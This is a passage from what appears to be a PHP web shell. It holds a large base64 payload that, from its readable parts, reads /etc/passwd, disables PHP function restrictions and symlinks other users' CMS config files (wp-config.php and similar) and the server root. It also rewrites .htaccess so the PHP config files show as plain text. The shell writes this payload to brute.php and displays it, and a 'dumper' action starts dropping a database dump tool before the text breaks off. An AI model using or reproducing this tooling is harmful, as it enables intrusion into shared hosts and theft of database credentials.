0gbWV0XHg2OFx4NmZkPVx4NzBceDZmXHg3M3Q+XHgzY1x4NjlucFx4NzV0IHRceDc5XHg3MFx4NjVceDNkXHg3M1x4NzVceDYyXHg2ZGlceDc0IFx4NmVhbWVceDNkaW5ceDY5IFx4NzZceDYxbHVceDY1PVx4MjJceDUwSFx4NTBceDJlXHg0OVx4NGVceDQ5XHgyMiAvXHgzZVxuXHgzY1x4NjZvcm0gXHg2ZGV0XHg2OG9kPVx4NzBceDZmXHg3M1x4NzQ+PFx4NjlucHVceDc0IHRceDc5cFx4NjVceDNkXHg3M1x4NzVibVx4NjlceDc0IG5hXHg2ZFx4NjU9XHgyMnVceDczcmVcIiB2XHg2MVx4NmN1XHg2NVx4M2RcIkNceDUyXHg0MUNceDRiRVJcIiAvPlx4M2MvXHg2Nlx4NmZybT48L2Zvcm0+XG5cdCI7aWYoaXNzZXQoJF9QT1NUWyJpXHg2ZWkiXSkpeyR7Ilx4NDdceDRjT0JBXHg0Y1x4NTMifVsiXHg2Y1x4NzdceDc2Zlx4NmRceDZmIl09ImxceDY5bmsiOyR7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDc1XHg3NW9lXHg2Y1x4NjRceDZjXHg2OFx4NmUiXX09Zm9wZW4oInBceDY4XHg3MFx4MmVceDY5XHg2ZWkiLCJ3Iik7JHsiXHg0N1x4NGNceDRmQkFceDRjXHg1MyJ9WyJceDcwXHg3Mlx4NzVkXHg2OFx4NzJzdFx4NmEiXT0iXHg3MiI7JHhja2RieWRnZD0iXHg3Mlx4NzIiOyR7JHsiR1x4NGNPQlx4NDFMXHg1MyJ9WyJsZ1x4NjNceDZka1x4NmJqIl19PSIgXHg2NFx4NjlzYlx4NjFceDZjXHg2NV9ceDY2dW5ceDYzdGlceDZmXHg2ZXNceDNkXHg2ZVx4NmZuXHg2NSAiO2Z3cml0ZSgkeyR7Ilx4NDdceDRjT0JBXHg0Y1MifVsicFx4NzJ1XHg2NFx4Njhyc3RqIl19LCR7JHhja2RieWRnZH0pOyR7JHsiXHg0N0xceDRmXHg0MkFceDRjXHg1MyJ9WyJuZmRceDZlXHg2OXlceDY1Il19PSJceDNjXHg2Mlx4NzI+XHgzY2EgaHJlZlx4M2RceDcwXHg2OHBceDJlaW5ceDY5Plx4M2NmXHg2Zlx4NmVceDc0IFx4NjNceDZmXHg2Y1x4NmZceDcyPXdoaVx4NzRlIFx4NzNceDY5elx4NjVceDNkMlx4MjBceDY2YWNlXHgzZFwiXHg1NEFIT1x4NGRBXHgyMlx4M2U8dVx4M2VceDNjXHg2Nlx4NmZceDZlXHg3NFx4MjBceDYzb2xceDZmXHg3Mlx4M2RyZWQ+RFx4NGZORTwvZm9uXHg3ND4gXHg0Zlx4NzBlblx4MjBceDc0XHg2OFx4NjlzIGxpbmsgXHg2OW5ceDIwbmVceDc3IHRhXHg2MiB0b1x4MjByXHg3NW5ceDIwUFx4NDhceDUwXHgyZUlOXHg0OTwvXHg3NVx4M2U8L2Zvblx4NzRceDNlXHgzYy9hXHgzZSI7ZWNobyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjUyJ9WyJceDZjXHg3N1x4NzZmXHg2ZFx4NmYiXX07fWlmKGlzc2V0KCRfUE9TVFsidVx4NzNyZSJdKSl7JHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjUyJ9WyJceDc5XHg2Nlx4NzdceDcyeWlceDZlIl09Ilx4NzVzZVx4NzIiO2VjaG8gIlx4M2Nmb3JceDZkXHgyMG1ceDY1XHg3NFx4NjhceDZmZD1ceDcwXHg2Zlx4NzNceDc0PlxuXHQ8XHg3NGVceDc4dGFceDcyZVx4NjFceDIwXHg3Mm93XHg3M1x4M2QxMCBjb1x4NmNceDczPVx4MzUwXHgyMFx4NmVceDYxXHg2ZGU9dXNlcj4iOyR7JHsiR1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJvXHg3NG1ceDc2d3V5XHg3MiJdfT1maWxlKCIvXHg2NXRjL3BceDYxXHg3M1x4NzNceDc3XHg2NCIpO2ZvcmVhY2goJHskeyJceDQ3XHg0Y09CQVx4NGNceDUzIn1bIlx4NmZceDc0XHg2ZFx4NzZ3XHg3NVx4NzlceDcyIl19IGFzJHskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNTIn1bIlx4NzlceDY2XHg3N1x4NzJ5XHg2OVx4NmUiXX0peyR7IkdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2ZVx4NmVwZWhceDZhcyJdPSJzXHg3NFx4NzIiOyR7IkdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg2Mlx4NmVceDYyXHg2ZXdceDZhdFx4NjZ5XHg2ZVx4NzciXT0idVx4NzNceDY1XHg3MiI7JHsiR0xPXHg0Mlx4NDFMXHg1MyJ9WyJceDY4XHg2MmJceDc1XHg3YVx4NzRceDY1XHg2ZXBceDc0Il09Ilx4NzNceDc0XHg3MiI7JHskeyJceDQ3XHg0Y09ceDQyXHg0MUxceDUzIn1bIlx4NmVceDZlXHg3MFx4NjVoXHg2YVx4NzMiXX09ZXhwbG9kZSgiOiIsJHskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNceDUzIn1bImJceDZlXHg2Mm53XHg2YVx4NzRmXHg3OW5ceDc3Il19KTtlY2hvJHskeyJceDQ3TFx4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NjhceDYyXHg2MnVceDdhdFx4NjVceDZlcHQiXX1bMF0uIlxuIjt9ZWNobyAiPC9ceDc0ZVx4Nzh0XHg2MXJceDY1XHg2MT5ceDNjXHg2MnJceDNlPFx4NjJyXHgzZVxuXHRceDNjXHg2OW5wdXRceDIwXHg3NHlceDcwXHg2NVx4M2RceDczXHg3NWJtaVx4NzRceDIwXHg2ZWFceDZkXHg2NT1zXHg3NVx4MjBceDc2XHg2MVx4NmN1ZVx4M2RcIlNceDc0XHg2MXJceDc0XHgyMFx4NDNyXHg2MWNceDZiXHg2OVx4NmVceDY3XCJceDIwL1x4M2VceDNjL1x4NjZvclx4NmQ+XG5cdCI7fWVjaG8gIlx0IjtlcnJvcl9yZXBvcnRpbmcoMCk7ZWNobyI8Zm9uXHg3NCBceDYzXHg2ZmxvXHg3Mlx4M2RceDcyZWQgXHg3M1x4Njl6ZVx4M2RceDMyXHgyMFx4NjZhXHg2M2VceDNkXHgyMlRBSFx4NGZceDRkQVx4MjI+IjtpZihpc3NldCgkX1BPU1RbInNceDc1Il0pKXtta2RpcigiXHg2MnQiLDA3NzcpOyRtaWZncW5taD0iXHg2NyI7JHsiR0xceDRmQlx4NDFceDRjXHg1MyJ9WyJceDYzXHg2ZVx4NmJlXHg2M1x4NzFceDYyXHg2ZFx4NzlceDY3YyJdPSJceDc1XHg3M1x4NzIiOyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2ZVx4NzZceDZhdXBceDYzaVx4Nzl4XHg2MiJdPSJyXHg3MiI7JHsiXHg0N1x4NGNceDRmQlx4NDFceDRjUyJ9WyJtXHg3Nlx4NzZpcHRceDY5XHg3MGF5Il09Ilx4NjJ0IjskeyJceDQ3XHg0Y09CQVx4NGNceDUzIn1bIlx4NzlceDY0dlx4NjJceDc2eFx4NzNceDc2Il09ImYiOyR7JHsiXHg0N1x4NGNPQlx4NDFMXHg1MyJ9WyJuXHg3Nlx4NmF1XHg3MFx4NjNpXHg3OVx4NzhceDYyIl19PSJceDIwT1x4NzB0aW9ceDZlcyBceDYxXHg2Y2wgXG4gRFx4NjlyZWNceDc0b1x4NzJceDc5SVx4NmVkZVx4NzhceDIwXHg1M1x4NzV4LmhceDc0XHg2ZGwgXG5ceDIwXHg0MWRceDY0XHg1NFx4NzlceDcwXHg2NVx4MjBceDc0XHg2NXh0L1x4NzBsXHg2MVx4NjlceDZlXHgyMC5ceDcwXHg2OHAgXG4gQWRkXHg0OFx4NjFceDZlZFx4NmNceDY1clx4MjBzZVx4NzJceDc2ZXItcGFyXHg3M2VceDY0XHgyMFx4MmVceDcwXHg2OFx4NzAgXG5ceDIwXHgyMFx4NDFceDY0ZFx4NTR5cFx4NjVceDIwXHg3NFx4NjVceDc4dC9wbFx4NjFpXHg2ZVx4MjBceDJlaHRtbCBcbiBBXHg2NGRceDQ4XHg2MVx4NmVceDY0XHg2Y1x4NjVyIFx4NzRceDc4dFx4MjAuaFx4NzRceDZkXHg2Y1x4MjBcblx4MjBceDUyXHg2NVx4NzFceDc1aXJceDY1IE5vblx4NjVceDIwXG5ceDIwU2F0aXNmXHg3OVx4MjBBXHg2ZXkiOyR7JHsiR1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDczXHg2MWZceDczXHg2ZVx4NzNceDcwdFx4NzEiXX09Zm9wZW4oIlx4NjJceDc0Ly5ceDY4XHg3NFx4NjFceDYzXHg2M2VceDczXHg3MyIsIlx4NzciKTskZGxnYmV3dG5yPSJjXHg2Zm5maVx4NjdceDc1XHg3Mlx4NjFceDc0XHg2OW9uIjskanhmdGVuPSJyXHg3MiI7ZndyaXRlKCR7JG1pZmdxbm1ofSwkeyRqeGZ0ZW59KTskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxceDUzIn1bIlx4NzdceDc1XHg2N1x4NzZ6XHg3OXl0Il09Ilx4NzVzciI7JHskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNTIn1bIlx4NmRceDc2XHg3Nlx4NjlwdGlwXHg2MVx4NzkiXX09c3ltbGluaygiLyIsIlx4NjJ0L1x4NzJceDZmXHg2Zlx4NzQiKTskeyR7Ilx4NDdceDRjT1x4NDJceDQxTFx4NTMifVsiXHg3OVx4Nzl4cGd0XHg2OWZceDYyIl19PSJceDNjYnI+PGFceDIwXHg2OFx4NzJlZj1idC9ceDcyb1x4NmZ0Plx4M2NmXHg2Zm5ceDc0XHgyMGNceDZmbFx4NmZceDcyPXdceDY4XHg2OVx4NzRlXHgyMHNceDY5elx4NjU9M1x4MjBmYVx4NjNceDY1XHgzZFwiXHg1NEFceDQ4XHg0Zk1ceDQxXCJceDNlIHJvb1x4NzQgPC9mb25ceDc0Plx4M2MvYVx4M2VceDNjZlx4NmZceDZlXHg3NCBceDYzXHg2Zmxvclx4M2RyXHg2NVx4NjRceDIwc2lceDdhXHg2NT0zIGZhY2VceDNkXHgyMlx4NTRBXHg0OFx4NGZNQVwiPlx4MjB+IDwvZm9udD4iO2VjaG8iPFx4NzVceDNlJHJ0PC9ceDc1PiI7JHsiXHg0N1x4NGNceDRmQlx4NDFMUyJ9WyJceDYyXHg3MFx4NmVceDY5XHg3OFx4NjJceDY4XHg3NndceDYyIl09Ilx4NjYiOyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDc4XHg3Mlx4NmVceDcycVx4NmVceDY1XHg2NVx4NzFceDc5XHg2Nlx4NmUiXX09bWtkaXIoIlx4NDJceDU0IiwwNzc3KTskeyR7Ilx4NDdMT0JceDQxTFMifVsidXVceDZmXHg2NVx4NmNkXHg2Y1x4NjhuIl19PSIgXHg0ZnBceDc0aVx4NmZuc1x4MjBceDYxXHg2Y2wgXG5ceDIwXHg0NGlyXHg2NWNceDc0XHg2Zlx4NzJ5SVx4NmVceDY0XHg2NXhceDIwXHg1M1x4NzVceDc4Llx4NjhceDc0XHg2ZFx4NmNceDIwXG4gQWRkXHg1NHlwXHg2NVx4MjB0ZVx4Nzh0L3BsXHg2MVx4NjluXHgyMFx4MmVwaHBceDIwXG5ceDIwXHg0MVx4NjRkSGFceDZlZGxceDY1ciBzZXJ2XHg2NXItcFx4NjFceDcyXHg3M2VkIC5wXHg2OHBceDIwXG5ceDIwIFx4NDFkXHg2NFR5cGVceDIwXHg3NFx4NjV4dC9ceDcwXHg2Y2Fpblx4MjAuXHg2OFx4NzRceDZkbCBcblx4MjBBZFx4NjRIYVx4NmVkXHg2Y2VyIFx4NzRceDc4XHg3NFx4MjAuXHg2OHRtXHg2Y1x4MjBcblx4MjBSXHg2NXFceDc1XHg2OVx4NzJceDY1IFx4NGVceDZmblx4NjUgXG4gXHg1M1x4NjF0aVx4NzNceDY2XHg3OVx4MjBBXHg2ZVx4NzkiOyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDc5XHg2NFx4NzZceDYydnhzXHg3NiJdfT1mb3BlbigiQlx4NTQvLlx4Njh0YVx4NjNceDYzZVx4NzNceDczIiwiXHg3NyIpO2Z3cml0ZSgkeyR7Ilx4NDdMXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg2MnBceDZlXHg2OVx4NzhceDYyXHg2OFx4NzZceDc3XHg2MiJdfSwkeyR7IkdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3NVx4NzVvXHg2NVx4NmNceDY0bFx4NjhuIl19KTskeyJceDQ3XHg0Y09CXHg0MVx4NGNceDUzIn1bIlx4NzFceDZhXHg3NFx4N2F4XHg2OFx4NjJoXHg2YVx4NjkiXT0iXHg3NVx4NzNzIjskeyR7Ilx4NDdceDRjXHg0ZkJBXHg0Y1x4NTMifVsiXHg3YVx4NmVceDZjZmNceDY3Il19PSJceDNjXHg2MSBceDY4clx4NjVceDY2PVx4NDJceDU0Lz5ceDNjXHg2Nm9ceDZldCBjXHg2Zlx4NmNceDZmXHg3Mlx4M2RceDc3aFx4NjlceDc0ZSBzaVx4N2FlPVx4MzMgXHg2Nlx4NjFjXHg2NT1ceDIyXHg1NFx4NDFceDQ4T01ceDQxXCJceDNlXHgyMCBjXHg2Zm5maVx4NjdceDczIDwvZlx4NmZuXHg3NFx4M2U8L2E+IjtlY2hvIjxceDc1PiRjb25zeW1ceDNjL1x4NzU+IjskeyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1MifVsiXHg2M25rXHg2NVx4NjNxYlx4NmRceDc5XHg2N2MiXX09ZXhwbG9kZSgiXG4iLCRfUE9TVFsidXNceDY1XHg3MiJdKTskeyRkbGdiZXd0bnJ9PWFycmF5KCJ3XHg3MC1ceDYzb25ceDY2aWcucFx4NjhceDcwIiwiXHg3N29yXHg2NFx4NzByXHg2NVx4NzNzL1x4NzdceDcwLVx4NjNceDZmblx4NjZceDY5Zy5ceDcwaHAiLCJceDYzb1x4NmVceDY2aVx4NjdceDc1cmFceDc0XHg2OW9uXHgyZXBceDY4cCIsImJceDZjXHg2ZmcvXHg3N3AtXHg2M29uXHg2Nlx4NjlceDY3LnBceDY4XHg3MCIsIlx4NmFvb21sXHg2MS9jXHg2Zm5ceDY2aVx4Njd1XHg3MmFceDc0XHg2OW9uXHgyZXBocCIsInNceDY5XHg3NGUvd1x4NzAtY29uXHg2Nlx4NjlnXHgyZXBceDY4XHg3MCIsInNpdFx4NjUvY29uZlx4NjlnXHg3NVx4NzJceDYxdFx4NjlceDZmbi5ceDcwaHAiLCJceDYzXHg2ZFx4NzMvY29ceDZlZlx4NjlceDY3XHg3NVx4NzJceDYxdFx4NjlceDZmXHg2ZS5waFx4NzAiLCJceDc2Yi9pXHg2ZWNceDZjdVx4NjRlXHg3My9ceDYzb25ceDY2aVx4NjdceDJlcFx4NjhwIiwiXHg2OVx4NmVceDYzbFx4NzVceDY0XHg2NXMvY1x4NmZuZmlnXHgyZVx4NzBocCIsImNvXHg2ZVx4NjZfXHg2N2xceDZmYlx4NjFsXHgyZXBceDY4XHg3MCIsImluXHg2My9jXHg2Zlx4NmVmXHg2OVx4NjdceDJlXHg3MFx4NjhwIiwiY1x4NmZuXHg2NmlceDY3XHgyZVx4NzBocCIsIlx4NTNlXHg3NHRceDY5blx4NjdceDczXHgyZXBoXHg3MCIsIlx4NzNpdGVceDczL1x4NjRceDY1XHg2NmF1XHg2Y1x4NzQvXHg3M2V0dFx4NjlceDZlXHg2N1x4NzMuXHg3MFx4NjhwIiwiXHg3N2hceDZkL1x4NjNvXHg2ZWZpZ1x4NzVceDcyXHg2MXRceDY5b25ceDJlcFx4NjhwIiwid1x4NjhtXHg2M3MvXHg2M29uXHg2Nlx4NjlceDY3dVx4NzJhdGlceDZmXHg2ZS5waFx4NzAiLCJceDczdVx4NzBwXHg2ZnJceDc0L1x4NjNvXHg2ZWZpZ1x4NzVceDcyYXRpXHg2Zlx4NmUucGhceDcwIiwid1x4NjhceDZkYy9ceDU3XHg0OE0vY29ceDZlXHg2Nlx4NjlnXHg3NVx4NzJceDYxXHg3NFx4Njlvblx4MmVceDcwXHg2OFx4NzAiLCJ3XHg2OFx4NmQvV1x4NDhceDRkXHg0M1x4NTMvY29uXHg2NmlceDY3dVx4NzJceDYxXHg3NFx4NjlceDZmbi5ceDcwaFx4NzAiLCJ3XHg2OFx4NmQvXHg3N2hceDZkY1x4NzMvY1x4NmZuXHg2Nlx4NjlndVx4NzJceDYxdFx4NjlceDZmXHg2ZVx4MmVwXHg2OFx4NzAiLCJceDczXHg3NXBceDcwb3J0L2NceDZmblx4NjZceDY5Z3VceDcyXHg2MVx4NzRceDY5XHg2Zlx4NmUucGhwIiwiY2xpXHg2NVx4NmVceDc0XHg3My9ceDYzb1x4NmVmXHg2OVx4Njd1clx4NjF0aW9uLnBocCIsIlx4NjNsaWVuXHg3NC9ceDYzXHg2Zlx4NmVmaVx4NjdceDc1XHg3MmF0XHg2OVx4NmZuXHgyZVx4NzBceDY4cCIsIlx4NjNsaVx4NjVceDZlXHg3NFx4NjVzL2Nvblx4NjZceDY5XHg2N1x4NzVyYVx4NzRceDY5XHg2Zm5ceDJlXHg3MFx4NjhceDcwIiwiY1x4NmNpZW5ceDc0ZS9ceDYzb25mXHg2OWd1XHg3Mlx4NjF0XHg2OVx4NmZceDZlLnBocCIsImNceDZjaWVudFx4NzNceDc1cFx4NzBvcnQvY1x4NmZceDZlZmlceDY3XHg3NXJceDYxXHg3NGlceDZmXHg2ZS5ceDcwXHg2OFx4NzAiLCJiXHg2OVx4NmNceDZjXHg2OVx4NmVnL1x4NjNvXHg2ZWZpZ1x4NzVceDcyYXRceDY5b25ceDJlcFx4NjhceDcwIiwiXHg2MVx4NjRtXHg2OVx4NmUvXHg2M1x4NmZuZmlceDY3LnBoXHg3MCIsImFkXHg2ZC9ceDYzXHg2Zm5ceDY2XHg2OVx4NjcuXHg3MFx4NjhceDcwIiwiXHg2M1x4NmRceDczL1x4NjNceDZmXHg2ZWZpZ1x4MmVceDcwXHg2OFx4NzAiKTtmb3JlYWNoKCR7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjUyJ9WyJceDc3XHg3NWdceDc2XHg3YVx4NzlceDc5dCJdfSBhcyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMUyJ9WyJceDcxXHg2YXR6XHg3OGhceDYyXHg2OFx4NmFpIl19KXskeyJceDQ3XHg0Y1x4NGZCQUxceDUzIn1bImlceDczXHg3N3BceDZmXHg3M3FiIl09InVceDczIjskeXZwaW9zdmhleHo9Ilx4NzVceDczXHg3MyI7JHskeyJceDQ3TE9ceDQyQVx4NGNTIn1bIlx4NjlceDczd3BceDZmc3FceDYyIl19PXRyaW0oJHskeXZwaW9zdmhleHp9KTtmb3JlYWNoKCR7JHsiR1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDc4XHg3M3NceDc1XHg2Ylx4NjVceDc0XHg2OGx4Il19IGFzJHskeyJceDQ3XHg0Y09CQUxceDUzIn1bImZ5XHg2N1x4NjZceDc3XHg2NnBwIl19KXskeyJceDQ3XHg0Y09CXHg0MVx4NGNTIn1bImVieWdhXHg3MFx4NzZceDdhIl09ImMiOyR7IkdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg2NFx4NzlceDc4d1x4NzdceDYyXHg2OGRceDdhXHg2OGIiXT0iXHg3MiI7JHsiXHg0N1x4NGNPXHg0MkFceDRjXHg1MyJ9WyJ5XHg2NXNceDZkbmRnXHg2M3MiXT0idVx4NzMiOyR7IkdceDRjXHg0ZkJBXHg0Y1x4NTMifVsiXHg3MFx4NjhceDY5XHg3OHJyZ1x4NzZceDcxdlx4NmIiXT0iXHg3Mlx4NzMiOyR7JHsiR1x4NGNPQlx4NDFceDRjUyJ9WyJceDcwaFx4NjlceDc4XHg3Mlx4NzJnXHg3Nlx4NzFceDc2XHg2YiJdfT0iL2hceDZmbWUvIi4keyR7IkdceDRjT1x4NDJBXHg0Y1MifVsiXHg3OWVzbW5ceDY0Z1x4NjNceDczIl19LiIvXHg3MFx4NzVceDYyXHg2Y2lceDYzXHg1Zlx4Njh0XHg2ZGwvIi4keyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg2Nlx4NzlceDY3XHg2Nlx4NzdceDY2XHg3MFx4NzAiXX07JHsiXHg0N1x4NGNPQlx4NDFceDRjXHg1MyJ9WyJceDZhXHg2N1x4NzBceDc0dFx4NzN0ZFx4NmFtIl09Ilx4NzJzIjskeyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg3NVx4NzVceDZmXHg2NVx4NmNceDY0XHg2Y1x4NjhceDZlIl19PSJCXHg1NC8iLiR7JHsiXHg0N1x4NGNPXHg0MkFceDRjXHg1MyJ9WyJ5dHFzaVx4NjRceDYyXHg3NVx4NzdceDYyIl19LiJceDIwXHgyZS5ceDIwIi4keyR7Ilx4NDdceDRjT1x4NDJceDQxTFx4NTMifVsiZVx4NjJ5XHg2N2FwXHg3NnoiXX07c3ltbGluaygkeyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsialx4NjdceDcwXHg3NFx4NzRceDczXHg3NGRceDZhXHg2ZCJdfSwkeyR7IkdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg2NFx4NzlceDc4XHg3N1x4NzdceDYyXHg2OFx4NjRceDdhXHg2OFx4NjIiXX0pO319fQo/Pg==
';
    $file       = fopen("brute.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=brute.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'dumper') {
    $file       = fopen($dir . "dumper.php", "w+");
    $file       = mkdir("backup");
    $file       = chmod("backup", 0755);
    $perltoolss = 'PD9waHAKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlwKfCBTeXBleCBEdW1wZXIgTGl0ZSAgICAgICAgICB2ZXJzaW9uIDEuMC44YiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAoYykyMDAzLTIwMDYgemFwaW1pciAgICAgICB6YXBpbWlyQHphcGltaXIubmV0ICAgICAgIGh0dHA6Ly9zeXBleC5uZXQvICAgIHwKfCAoYykyMDA1LTIwMDYgQklOT1ZBVE9SICAgICBpbmZvQHN5cGV4Lm5ldCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKfCAgICAgY3JlYXRlZDogMjAwMy4wOS4wMiAxOTowNyAgICAgICAgICAgICAgbW9kaWZpZWQ6IDIwMDguMTIuMTQgICAgICAgICAgIHwKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKfCBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yICAgICAgICAgICAgIHwKfCBtb2RpZnkgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSAgICAgICAgICAgICAgIHwKfCBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiAgICAgICAgICAgIHwKfCBvZiB0aGUgTGljZW5zZSwgb3IgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4gICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwgICAgICAgICAgIHwKfCBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZiAgICAgICAgICAgIHwKfCBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlICAgICAgICAgICAgIHwKfCBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSAgICAgICAgIHwKfCBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSAgICAgICAgICAgICAgIHwKfCBGb3VuZGF0aW9uLCBJbmMuLCA1OSBUZW1wbGUgUGxhY2UgLSBTdWl0ZSAzMzAsIEJvc3RvbiwgTUEgMDIxMTEtMTMwNyxVU0EuIHwKXCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8vIHBhdGggYW5kIFVSTCB0byBiYWNrdXAgZmlsZXMKZGVmaW5lKCdQQVRIJywgJ2JhY2t1cC8nKTsKZGVmaW5lKCdVUkwnLCAgJ2JhY2t1cC8nKTsKLy8gTWF4IHRpbWUgZm9yIHRoaXMgc2NyaXB0IHdvcmsgKGluIHNlY29uZHMpCi8vIDAgLSBubyBsaW1pdApkZWZpbmUoJ1RJTUVfTElNSVQnLCA2MDApOwovLyDQntCz0YDQsNC90LjRh9C10L3QuNC1INGA0LDQt9C80LXRgNCwINC00LDQvdC90YvRhSDQtNC+0YHRgtCw0LLQsNC10LzRi9GFINC30LAg0L7QtNC90L4g0L7QsdGA0LDRidC10L3QuNGPINC6INCR0JQgKNCyINC80LXQs9Cw0LHQsNC50YLQsNGFKQovLyDQndGD0LbQvdC+INC00LvRjyDQvtCz0YDQsNC90LjRh9C10L3QuNGPINC60L7Qu9C40YfQtdGB0YLQstCwINC/0LDQvNGP0YLQuCDQv9C+0LbQuNGA0LDQtdC80L7QuSDRgdC10YDQstC10YDQvtC8INC/0YDQuCDQtNCw0LzQv9C1INC+0YfQtdC90Ywg0L7QsdGK0LXQvNC90YvRhSDRgtCw0LHQu9C40YYKZGVmaW5lKCdMSU1JVCcsIDEpOwovLyBteXNxbCBzZXJ2ZXIKZGVmaW5lKCdEQkhPU1QnLCAnbG9jYWxob3N0OjMzMDYnKTsKLy8gRGF0YWJhc2VzLiBJdCBpcyBuZWVkIGlmIHNlcnZlciBkb2VzIG5vdCBhbGxvdyBsaXN0IGRhdGFiYXNlIG5hbWVzCi8vIGFuZCBub3RoaW5nIHNob3dzIGFmdGVyIGxvZ2luLiAoc2VwYXJhdGVkIGJ5IGNvbW1hKQpkZWZpbmUoJ0RCTkFNRVMnLCAnJyk7Ci8vINCa0L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyDRgSBNeVNRTAovLyBhdXRvIC0g0LDQstGC0L7QvNCw0YLQuNGH0LXRgdC60LjQuSDQstGL0LHQvtGAICjRg9GB0YLQsNC90LDQstC70LjQstCw0LXRgtGB0Y8g0LrQvtC00LjRgNC+0LLQutCwINGC0LDQsdC70LjRhtGLKSwgY3AxMjUxIC0gd2luZG93cy0xMjUxLCDQuCDRgi7Qvy4KZGVmaW5lKCdDSEFSU0VUJywgJ2F1dG8nKTsKLy8g0JrQvtC00LjRgNC+0LLQutCwINGB0L7QtdC00LjQvdC10L3QuNGPINGBIE15U1FMINC/0YDQuCDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC4Ci8vINCd0LAg0YHQu9GD0YfQsNC5INC/0LXRgNC10L3QvtGB0LAg0YHQviDRgdGC0LDRgNGL0YUg0LLQtdGA0YHQuNC5IE15U1FMICjQtNC+IDQuMSksINGDINC60L7RgtC+0YDRi9GFINC90LUg0YPQutCw0LfQsNC90LAg0LrQvtC00LjRgNC+0LLQutCwINGC0LDQsdC70LjRhiDQsiDQtNCw0LzQv9C1Ci8vINCf0YDQuCDQtNC+0LHQsNCy0LvQtdC90LjQuCAnZm9yY2VkLT4nLCDQuiDQv9GA0LjQvNC10YDRgyAnZm9yY2VkLT5jcDEyNTEnLCDQutC+0LTQuNGA0L7QstC60LAg0YLQsNCx0LvQuNGGINC/0YDQuCDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC4INCx0YPQtNC10YIg0L/RgNC40L3Rg9C00LjRgtC10LvRjNC90L4g0LfQsNC80LXQvdC10L3QsCDQvdCwIGNwMTI1MQovLyDQnNC+0